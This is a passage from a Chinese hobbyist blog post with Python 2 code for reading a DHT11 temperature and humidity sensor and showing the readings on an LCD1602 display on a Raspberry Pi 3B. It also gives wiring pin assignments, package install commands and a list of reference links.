GPIO.setmode(GPIO.BOARD)</div><div class=\"line\"></div><div class=\"line\">  time.sleep(<span class=\"number\">1</span>)</div><div class=\"line\"></div><div class=\"line\">  GPIO.setup(channel, GPIO.OUT)</div><div class=\"line\">  GPIO.output(channel, GPIO.LOW)</div><div class=\"line\">  time.sleep(<span class=\"number\">0.5</span>)</div><div class=\"line\">  GPIO.output(channel, GPIO.HIGH)</div><div class=\"line\">  GPIO.setup(channel, GPIO.IN)</div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">while</span> GPIO.input(channel) == GPIO.LOW:</div><div class=\"line\">    <span class=\"keyword\">continue</span></div><div class=\"line\">  <span class=\"keyword\">while</span> GPIO.input(channel) == GPIO.HIGH:</div><div class=\"line\">    <span class=\"keyword\">continue</span></div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">while</span> j &lt; <span class=\"number\">40</span>:</div><div class=\"line\">    k = <span class=\"number\">0</span></div><div class=\"line\">    <span class=\"keyword\">while</span> GPIO.input(channel) == GPIO.LOW:</div><div class=\"line\">      <span class=\"keyword\">continue</span></div><div class=\"line\">    <span class=\"keyword\">while</span> GPIO.input(channel) == GPIO.HIGH:</div><div class=\"line\">      k += <span class=\"number\">1</span></div><div class=\"line\">      <span class=\"keyword\">if</span> k &gt; <span class=\"number\">100</span>:</div><div class=\"line\">        <span class=\"keyword\">break</span></div><div class=\"line\">    <span class=\"keyword\">if</span> k &lt; <span class=\"number\">8</span>:</div><div class=\"line\">      data.append(<span class=\"number\">0</span>)</div><div class=\"line\">    <span class=\"keyword\">else</span>:</div><div class=\"line\">      data.append(<span class=\"number\">1</span>)</div><div class=\"line\"></div><div class=\"line\">    j += <span class=\"number\">1</span></div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">print</span> <span class=\"string\">\"sensor is working.\"</span></div><div class=\"line\">  <span class=\"keyword\">print</span> data</div><div class=\"line\"></div><div class=\"line\">  humidity_bit = data[<span class=\"number\">0</span>:<span class=\"number\">8</span>]</div><div class=\"line\">  humidity_point_bit = data[<span class=\"number\">8</span>:<span class=\"number\">16</span>]</div><div class=\"line\">  temperature_bit = data[<span class=\"number\">16</span>:<span class=\"number\">24</span>]</div><div class=\"line\">  temperature_point_bit = data[<span class=\"number\">24</span>:<span class=\"number\">32</span>]</div><div class=\"line\">  check_bit = data[<span class=\"number\">32</span>:<span class=\"number\">40</span>]</div><div class=\"line\"></div><div class=\"line\">  humidity = <span class=\"number\">0</span></div><div class=\"line\">  humidity_point = <span class=\"number\">0</span></div><div class=\"line\">  temperature = <span class=\"number\">0</span></div><div class=\"line\">  temperature_point = <span class=\"number\">0</span></div><div class=\"line\">  check = <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">8</span>):</div><div class=\"line\">    humidity += humidity_bit[i] * <span class=\"number\">2</span> ** (<span class=\"number\">7</span>-i)</div><div class=\"line\">    humidity_point += humidity_point_bit[i] * <span class=\"number\">2</span> ** (<span class=\"number\">7</span>-i)</div><div class=\"line\">    temperature += temperature_bit[i] * <span class=\"number\">2</span> ** (<span class=\"number\">7</span>-i)</div><div class=\"line\">    temperature_point += temperature_point_bit[i] * <span class=\"number\">2</span> ** (<span class=\"number\">7</span>-i)</div><div class=\"line\">    check += check_bit[i] * <span class=\"number\">2</span> ** (<span class=\"number\">7</span>-i)</div><div class=\"line\"></div><div class=\"line\">  tmp = humidity + humidity_point + temperature + temperature_point</div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">if</span> check == tmp:</div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'temp:'</span> + str(temperature) + <span class=\"string\">' C \\nhumidity:'</span> + str(humidity) + <span class=\"string\">'%'</span></div><div class=\"line\">  <span class=\"keyword\">else</span>:</div><div class=\"line\">    get_tmp()</div><div class=\"line\"></div><div class=\"line\">  GPIO.cleanup()    </div><div class=\"line\"></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Adafruit_CharLCD</span>:</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># commands</span></div><div class=\"line\">    LCD_CLEARDISPLAY            = <span class=\"number\">0x01</span></div><div class=\"line\">    LCD_RETURNHOME                  = <span class=\"number\">0x02</span></div><div class=\"line\">    LCD_ENTRYMODESET            = <span class=\"number\">0x04</span></div><div class=\"line\">    LCD_DISPLAYCONTROL          = <span class=\"number\">0x08</span></div><div class=\"line\">    LCD_CURSORSHIFT             = <span class=\"number\">0x10</span></div><div class=\"line\">    LCD_FUNCTIONSET             = <span class=\"number\">0x20</span></div><div class=\"line\">    LCD_SETCGRAMADDR            = <span class=\"number\">0x40</span></div><div class=\"line\">    LCD_SETDDRAMADDR            = <span class=\"number\">0x80</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># flags for display entry mode</span></div><div class=\"line\">    LCD_ENTRYRIGHT              = <span class=\"number\">0x00</span></div><div class=\"line\">    LCD_ENTRYLEFT               = <span class=\"number\">0x02</span></div><div class=\"line\">    LCD_ENTRYSHIFTINCREMENT     = <span class=\"number\">0x01</span></div><div class=\"line\">    LCD_ENTRYSHIFTDECREMENT     = <span class=\"number\">0x00</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># flags for display on/off control</span></div><div class=\"line\">    LCD_DISPLAYON               = <span class=\"number\">0x04</span></div><div class=\"line\">    LCD_DISPLAYOFF              = <span class=\"number\">0x00</span></div><div class=\"line\">    LCD_CURSORON                = <span class=\"number\">0x02</span></div><div class=\"line\">    LCD_CURSOROFF               = <span class=\"number\">0x00</span></div><div class=\"line\">    LCD_BLINKON                 = <span class=\"number\">0x01</span></div><div class=\"line\">    LCD_BLINKOFF                = <span class=\"number\">0x00</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># flags for display/cursor shift</span></div><div class=\"line\">    LCD_DISPLAYMOVE             = <span class=\"number\">0x08</span></div><div class=\"line\">    LCD_CURSORMOVE              = <span class=\"number\">0x00</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># flags for display/cursor shift</span></div><div class=\"line\">    LCD_DISPLAYMOVE             = <span class=\"number\">0x08</span></div><div class=\"line\">    LCD_CURSORMOVE              = <span class=\"number\">0x00</span></div><div class=\"line\">    LCD_MOVERIGHT               = <span class=\"number\">0x04</span></div><div class=\"line\">    LCD_MOVELEFT                = <span class=\"number\">0x00</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># flags for function set</span></div><div class=\"line\">    LCD_8BITMODE                = <span class=\"number\">0x10</span></div><div class=\"line\">    LCD_4BITMODE                = <span class=\"number\">0x00</span></div><div class=\"line\">    LCD_2LINE                   = <span class=\"number\">0x08</span></div><div class=\"line\">    LCD_1LINE                   = <span class=\"number\">0x00</span></div><div class=\"line\">    LCD_5x10DOTS                = <span class=\"number\">0x04</span></div><div class=\"line\">    LCD_5x8DOTS                 = <span class=\"number\">0x00</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self, pin_rs=<span class=\"number\">8</span>, pin_e=<span class=\"number\">10</span>, pins_db=[<span class=\"number\">11</span>,<span class=\"number\">12</span>,<span class=\"number\">13</span>,<span class=\"number\">15</span>], GPIO = None)</span>:</span></div><div class=\"line\">        <span class=\"comment\"># Emulate the old behavior of using RPi.GPIO if we haven't been given</span></div><div class=\"line\">        <span class=\"comment\"># an explicit GPIO interface to use</span></div><div class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> GPIO:</div><div class=\"line\">            <span class=\"keyword\">import</span> RPi.GPIO <span class=\"keyword\">as</span> GPIO</div><div class=\"line\">        GPIO.setwarnings(<span class=\"keyword\">False</span>)</div><div class=\"line\"></div><div class=\"line\">        self.GPIO = GPIO</div><div class=\"line\">        self.pin_rs = pin_rs</div><div class=\"line\">        self.pin_e = pin_e</div><div class=\"line\">        self.pins_db = pins_db</div><div class=\"line\"></div><div class=\"line\">        self.GPIO.setmode(GPIO.BOARD)</div><div class=\"line\">        self.GPIO.setup(self.pin_e, GPIO.OUT)</div><div class=\"line\">        self.GPIO.setup(self.pin_rs, GPIO.OUT)</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">for</span> pin <span class=\"keyword\">in</span> self.pins_db:</div><div class=\"line\">            self.GPIO.setup(pin, GPIO.OUT)</div><div class=\"line\"></div><div class=\"line\">        self.write4bits(<span class=\"number\">0x33</span>) <span class=\"comment\"># initialization</span></div><div class=\"line\">        self.write4bits(<span class=\"number\">0x32</span>) <span class=\"comment\"># initialization</span></div><div class=\"line\">        self.write4bits(<span class=\"number\">0x28</span>) <span class=\"comment\"># 2 line 5x7 matrix</span></div><div class=\"line\">        self.write4bits(<span class=\"number\">0x0C</span>) <span class=\"comment\"># turn cursor off 0x0E to enable cursor</span></div><div class=\"line\">        self.write4bits(<span class=\"number\">0x06</span>) <span class=\"comment\"># shift cursor right</span></div><div class=\"line\"></div><div class=\"line\">        self.displaycontrol = self.LCD_DISPLAYON | self.LCD_CURSOROFF | self.LCD_BLINKOFF</div><div class=\"line\"></div><div class=\"line\">        self.displayfunction = self.LCD_4BITMODE | self.LCD_1LINE | self.LCD_5x8DOTS</div><div class=\"line\">        self.displayfunction |= self.LCD_2LINE</div><div class=\"line\"></div><div class=\"line\">        <span class=\"string\">\"\"\" Initialize to default text direction (for romance languages) \"\"\"</span></div><div class=\"line\">        self.displaymode =  self.LCD_ENTRYLEFT | self.LCD_ENTRYSHIFTDECREMENT</div><div class=\"line\">        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode) <span class=\"comment\">#  set the entry mode</span></div><div class=\"line\"></div><div class=\"line\">        self.clear()</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">begin</span><span class=\"params\">(self, cols, lines)</span>:</span></div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">if</span> (lines &gt; <span class=\"number\">1</span>):</div><div class=\"line\">                self.numlines = lines</div><div class=\"line\">                self.displayfunction |= self.LCD_2LINE</div><div class=\"line\">                self.currline = <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">home</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\"></div><div class=\"line\">        self.write4bits(self.LCD_RETURNHOME) <span class=\"comment\"># set cursor position to zero</span></div><div class=\"line\">        self.delayMicroseconds(<span class=\"number\">3000</span>) <span class=\"comment\"># this command takes a long time!</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">clear</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\"></div><div class=\"line\">        self.write4bits(self.LCD_CLEARDISPLAY) <span class=\"comment\"># command to clear display</span></div><div class=\"line\">        self.delayMicroseconds(<span class=\"number\">3000</span>)    <span class=\"comment\"># 3000 microsecond sleep, clearing the display takes a long time</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">setCursor</span><span class=\"params\">(self, col, row)</span>:</span></div><div class=\"line\"></div><div class=\"line\">        self.row_offsets = [ <span class=\"number\">0x00</span>, <span class=\"number\">0x40</span>, <span class=\"number\">0x14</span>, <span class=\"number\">0x54</span> ]</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">if</span> ( row &gt; self.numlines ): </div><div class=\"line\">                row = self.numlines - <span class=\"number\">1</span> <span class=\"comment\"># we count rows starting w/0</span></div><div class=\"line\"></div><div class=\"line\">        self.write4bits(self.LCD_SETDDRAMADDR | (col + self.row_offsets[row]))</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">noDisplay</span><span class=\"params\">(self)</span>:</span> </div><div class=\"line\">        <span class=\"string\">\"\"\" Turn the display off (quickly) \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaycontrol &amp;= ~self.LCD_DISPLAYON</div><div class=\"line\">        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">display</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" Turn the display on (quickly) \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaycontrol |= self.LCD_DISPLAYON</div><div class=\"line\">        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">noCursor</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" Turns the underline cursor on/off \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaycontrol &amp;= ~self.LCD_CURSORON</div><div class=\"line\">        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">cursor</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" Cursor On \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaycontrol |= self.LCD_CURSORON</div><div class=\"line\">        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">noBlink</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" Turn on and off the blinking cursor \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaycontrol &amp;= ~self.LCD_BLINKON</div><div class=\"line\">        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">noBlink</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" Turn on and off the blinking cursor \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaycontrol &amp;= ~self.LCD_BLINKON</div><div class=\"line\">        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">DisplayLeft</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" These commands scroll the display without changing the RAM \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.write4bits(self.LCD_CURSORSHIFT | self.LCD_DISPLAYMOVE | self.LCD_MOVELEFT)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">scrollDisplayRight</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" These commands scroll the display without changing the RAM \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.write4bits(self.LCD_CURSORSHIFT | self.LCD_DISPLAYMOVE | self.LCD_MOVERIGHT);</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">leftToRight</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" This is for text that flows Left to Right \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaymode |= self.LCD_ENTRYLEFT</div><div class=\"line\">        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode);</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">rightToLeft</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" This is for text that flows Right to Left \"\"\"</span></div><div class=\"line\">        self.displaymode &amp;= ~self.LCD_ENTRYLEFT</div><div class=\"line\">        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">autoscroll</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" This will 'right justify' text from the cursor \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaymode |= self.LCD_ENTRYSHIFTINCREMENT</div><div class=\"line\">        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">noAutoscroll</span><span class=\"params\">(self)</span>:</span> </div><div class=\"line\">        <span class=\"string\">\"\"\" This will 'left justify' text from the cursor \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaymode &amp;= ~self.LCD_ENTRYSHIFTINCREMENT</div><div class=\"line\">        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">write4bits</span><span class=\"params\">(self, bits, char_mode=False)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" Send command to LCD \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.delayMicroseconds(<span class=\"number\">1000</span>) <span class=\"comment\"># 1000 microsecond sleep</span></div><div class=\"line\"></div><div class=\"line\">        bits=bin(bits)[<span class=\"number\">2</span>:].zfill(<span class=\"number\">8</span>)</div><div class=\"line\"></div><div class=\"line\">        self.GPIO.output(self.pin_rs, char_mode)</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">for</span> pin <span class=\"keyword\">in</span> self.pins_db:</div><div class=\"line\">            self.GPIO.output(pin, <span class=\"keyword\">False</span>)</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">4</span>):</div><div class=\"line\">            <span class=\"keyword\">if</span> bits[i] == <span class=\"string\">\"1\"</span>:</div><div class=\"line\">                self.GPIO.output(self.pins_db[::<span class=\"number\">-1</span>][i], <span class=\"keyword\">True</span>)</div><div class=\"line\"></div><div class=\"line\">        self.pulseEnable()</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">for</span> pin <span class=\"keyword\">in</span> self.pins_db:</div><div class=\"line\">            self.GPIO.output(pin, <span class=\"keyword\">False</span>)</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">4</span>,<span class=\"number\">8</span>):</div><div class=\"line\">            <span class=\"keyword\">if</span> bits[i] == <span class=\"string\">\"1\"</span>:</div><div class=\"line\">                self.GPIO.output(self.pins_db[::<span class=\"number\">-1</span>][i<span class=\"number\">-4</span>], <span class=\"keyword\">True</span>)</div><div class=\"line\"></div><div class=\"line\">        self.pulseEnable()</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delayMicroseconds</span><span class=\"params\">(self, microseconds)</span>:</span></div><div class=\"line\">        seconds = microseconds / float(<span class=\"number\">1000000</span>) <span class=\"comment\"># divide microseconds by 1 million for seconds</span></div><div class=\"line\">        sleep(seconds)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">pulseEnable</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        self.GPIO.output(self.pin_e, <span class=\"keyword\">False</span>)</div><div class=\"line\">        self.delayMicroseconds(<span class=\"number\">1</span>)               <span class=\"comment\"># 1 microsecond pause - enable pulse must be &gt; 450ns </span></div><div class=\"line\">        self.GPIO.output(self.pin_e, <span class=\"keyword\">True</span>)</div><div class=\"line\">        self.delayMicroseconds(<span class=\"number\">1</span>)               <span class=\"comment\"># 1 microsecond pause - enable pulse must be &gt; 450ns </span></div><div class=\"line\">        self.GPIO.output(self.pin_e, <span class=\"keyword\">False</span>)</div><div class=\"line\">        self.delayMicroseconds(<span class=\"number\">1</span>)               <span class=\"comment\"># commands need &gt; 37us to settle</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">message</span><span class=\"params\">(self, text)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" Send string to LCD. Newline wraps to second line\"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">for</span> char <span class=\"keyword\">in</span> text:</div><div class=\"line\">            <span class=\"keyword\">if</span> char == <span class=\"string\">'\\n'</span>:</div><div class=\"line\">                self.write4bits(<span class=\"number\">0xC0</span>) <span class=\"comment\"># next line</span></div><div class=\"line\">            <span class=\"keyword\">else</span>:</div><div class=\"line\">                self.write4bits(ord(char),<span class=\"keyword\">True</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\"></div><div class=\"line\">    <span class=\"keyword\">while</span> <span class=\"keyword\">True</span>:</div><div class=\"line\">        tmp = get_tmp() </div><div class=\"line\">        <span class=\"keyword\">if</span> tmp:</div><div class=\"line\">            lcd = Adafruit_CharLCD()</div><div class=\"line\">            lcd.noBlink()</div><div class=\"line\">            lcd.clear()</div><div class=\"line\">            lcd.message(tmp)</div><div class=\"line\">        sleep(<span class=\"number\">5</span>)</div></pre></td></tr></table></figure></p>\n<h1 id=\"运行效果\"><a href=\"#运行效果\" class=\"headerlink\" title=\"运行效果\"></a>运行效果</h1><p><img src=\"/content/images/2016/08/WechatIMG302.jpeg\" alt=\"\"></p>\n<p><img src=\"/content/images/2016/08/WechatIMG293.jpeg\" alt=\"\"></p>\n<h1 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h1><p><a href=\"https://gist.github.com/hugozhu/6166527\" target=\"_blank\" rel=\"external\">https://gist.github.com/hugozhu/6166527</a><br><a href=\"https://github.com/adafruit/Adafruit-Raspberry-Pi-Python-Code/tree/2d4678fdccec1b93d8d69ba7768f6698545b2c5f\" target=\"_blank\" rel=\"external\">https://github.com/adafruit/Adafruit-Raspberry-Pi-Python-Code/tree/2d4678fdccec1b93d8d69ba7768f6698545b2c5f</a><br><a href=\"https://github.com/op2-project/op2-daemon/blob/master/op2d/hal/backend/pihelpers/lcd.py\" target=\"_blank\" rel=\"external\">https://github.com/op2-project/op2-daemon/blob/master/op2d/hal/backend/pihelpers/lcd.py</a><br><a href=\"http://blog.csdn.net/xukai871105/article/details/12684617\" target=\"_blank\" rel=\"external\">http://blog.csdn.net/xukai871105/article/details/12684617</a><br><a href=\"https://www.oschina.net/question/1425530\\_140979\" target=\"_blank\" rel=\"external\">https://www.oschina.net/question/1425530\\_140979</a><br><a href=\"http://bbs.elecfans.com/jishu\\_578437\\_1\\_1.html\" target=\"_blank\" rel=\"external\">http://bbs.elecfans.com/jishu\\_578437\\_1\\_1.html</a><br><a href=\"http://blog.csdn.net/netccy/article/details/48098455\" target=\"_blank\" rel=\"external\">http://blog.csdn.net/netccy/article/details/48098455</a><br><a href=\"https://www.6zou.net/tech/raspberry-pi-lcd1602-system-monitor.html\" target=\"_blank\" rel=\"external\">https://www.6zou.net/tech/raspberry-pi-lcd1602-system-monitor.html</a><br><a href=\"http://hugozhu.myalert.info/2013/03/23/19-raspberry-pi-drive-1602-lcd.html\" target=\"_blank\" rel=\"external\">http://hugozhu.myalert.info/2013/03/23/19-raspberry-pi-drive-1602-lcd.html</a><br><a href=\"http://hugozhu.myalert.info/2013/03/22/19-raspberry-pi-gpio-port-naming.html\" target=\"_blank\" rel=\"external\">http://hugozhu.myalert.info/2013/03/22/19-raspberry-pi-gpio-port-naming.html</a><br><a href=\"http://blog.csdn.net/rocklee/article/details/50082777\" target=\"_blank\" rel=\"external\">http://blog.csdn.net/rocklee/article/details/50082777</a><br><a href=\"http://www.guokr.com/post/718305/\" target=\"_blank\" rel=\"external\">http://www.guokr.com/post/718305/</a><br><a href=\"http://www.rs-online.com/designspark/electronics/blog/content-1148\" target=\"_blank\" rel=\"external\">http://www.rs-online.com/designspark/electronics/blog/content-1148</a><br><a href=\"http://bbs.elecfans.com/jishu\\_582479\\_1\\_1.html\" target=\"_blank\" rel=\"external\">http://bbs.elecfans.com/jishu\\_582479\\_1\\_1.html</a><br><a href=\"https://www.freemindworld.com/blog/2013/130310\\_raspberry\\_pi\\_with\\_lcd.shtml\" target=\"_blank\" rel=\"external\">https://www.freemindworld.com/blog/2013/130310\\_raspberry\\_pi\\_with\\_lcd.shtml</a><br><a href=\"http://blog.csdn.net/u013431550/article/details/40870947\" target=\"_blank\" rel=\"external\">http://blog.csdn.net/u013431550/article/details/40870947</a><br><a href=\"http://www.shumeipai.net/thread-21026-1-1.html?_dsign=0e7b69ba\" target=\"_blank\" rel=\"external\">http://www.shumeipai.net/thread-21026-1-1.html?_dsign=0e7b69ba</a><br><a href=\"http://blog.csdn.net/longerzone/article/details/36171381\" target=\"_blank\" rel=\"external\">http://blog.csdn.net/longerzone/article/details/36171381</a></p>\n","excerpt":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>很早就入了树莓派，一直没有折腾GPIO功能，虽然我是学自动化的，但是我对引脚之类的一窍不通，做这个也是为了预习一下本专业的知识，而更多的，是乐趣。</p>\n<p>在淘宝上网购了原料之后，回家发现网上并没有树莓派3B的教程，大部分都是树莓派2B的教程，而树莓派3B的GPIO图都发生了变化，因此写本文的目的还在于帮助更多的人，填补互联网的空白。<br>","more":"</p>\n<h1 id=\"知识储备\"><a href=\"#知识储备\" class=\"headerlink\" title=\"知识储备\"></a>知识储备</h1><ul>\n<li>数字电子技术基础</li>\n<li>微机原理与接口技术</li>\n<li>python语言</li>\n</ul>\n<h1 id=\"原料\"><a href=\"#原料\" class=\"headerlink\" title=\"原料\"></a>原料</h1><ul>\n<li>树莓派3B</li>\n<li>DHT11</li>\n<li>LCD1602</li>\n<li>2K电阻（也可以是电位器）</li>\n<li>子-母 和 母-母 杜邦线</li>\n<li>电气绝缘胶带</li>\n<li>剪刀</li>\n<li>一颗耐心和一颗细心</li>\n</ul>\n<h1 id=\"语言\"><a href=\"#语言\" class=\"headerlink\" title=\"语言\"></a>语言</h1><ul>\n<li>Python 2.7</li>\n</ul>\n<h1 id=\"组件\"><a href=\"#组件\" class=\"headerlink\" title=\"组件\"></a>组件</h1><ul>\n<li>python-dev</li>\n<li>python-rpi.gpio<br>如果不具备以上，请执行：<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get update</div><div class=\"line\">sudo apt-get install python-dev</div><div class=\"line\">sudo apt-get install python-rpi.gpio</div></pre></td></tr></table></figure>\n</li>\n</ul>\n<h1 id=\"接线\"><a href=\"#接线\" class=\"headerlink\" title=\"接线\"></a>接线</h1><p>我们一共要完成两个任务：</p>\n<ul>\n<li>1.连接LCD1602</li>\n<li>2.连接DHT11</li>\n</ul>\n<p>树莓派3B的GPIO图如下：</p>\n<p><img src=\"/content/images/2016/08/GPIO.png\" alt=\"\"></p>\n<h2 id=\"2K-电阻如何连接到电路\"><a href=\"#2K-电阻如何连接到电路\" class=\"headerlink\" title=\"2K 电阻如何连接到电路\"></a>2K 电阻如何连接到电路</h2><p>简单粗暴的方法就是把电阻两头连接到两个子-母杜邦线上，然后用绝缘胶布缠上，非常方便美观。</p>\n<h2 id=\"LCD1602-接线方案\"><a href=\"#LCD1602-接线方案\" class=\"headerlink\" title=\"LCD1602 接线方案\"></a>LCD1602 接线方案</h2><p>LCD 与 树莓派相连 方案图，2K电阻是我自行设计，如果有电位器最好放置电位器：<br><img src=\"/content/images/2016/08/LCD1602--.jpg\" alt=\"\"></p>\n<p>树莓派的USB端口朝下，电源线位置朝上方向摆放。<br>右端一共有40个引脚，每个引脚的PIN位置如上。</p>\n<p>VSS，接地，RPi PIN 6<br>VDD，接5V电源，PRi PIN 2<br>VO，液晶对比度调节，接1K 电阻，另一端相连接地，PIN 9<br>RS，寄存器选择，接GPIO 14，RPi PIN 8<br>RW，读写选择，接地，表示写模式，PRi PIN 6<br>E，使能信号，接GPIO 15，RPi PIN 10<br>D0，数据位0，4位工作模式下不用，不接<br>D1，数据位1，4位工作模式下不用，不接<br>D2，数据位2，4位工作模式下不用，不接<br>D3，数据位3，4位工作模式下不用，不接<br>D4，数据位4，接GPIO 17，RPi PIN 11<br>D5，数据位5，接GPIO 18，RPi PIN 12<br>D6，数据位6，接GPIO 27，RPi PIN 13<br>D7，数据位7，接GPIO 22，RPi PIN 15<br>A，液晶屏背光+，接5V，RPi PIN 4<br>K，液晶屏背光-，接地，RPi PIN 39</p>\n<p><strong>连接好后，务必要仔细检查是否连接正确，以防开机烧坏GPIO甚至树莓派。</strong></p>\n<p>建议在关机情况下接线，如果在开机情况下接线，VDD请最后连接。</p>\n<h2 id=\"LCD1602-开机测试\"><a href=\"#LCD1602-开机测试\" class=\"headerlink\" title=\"LCD1602 开机测试\"></a>LCD1602 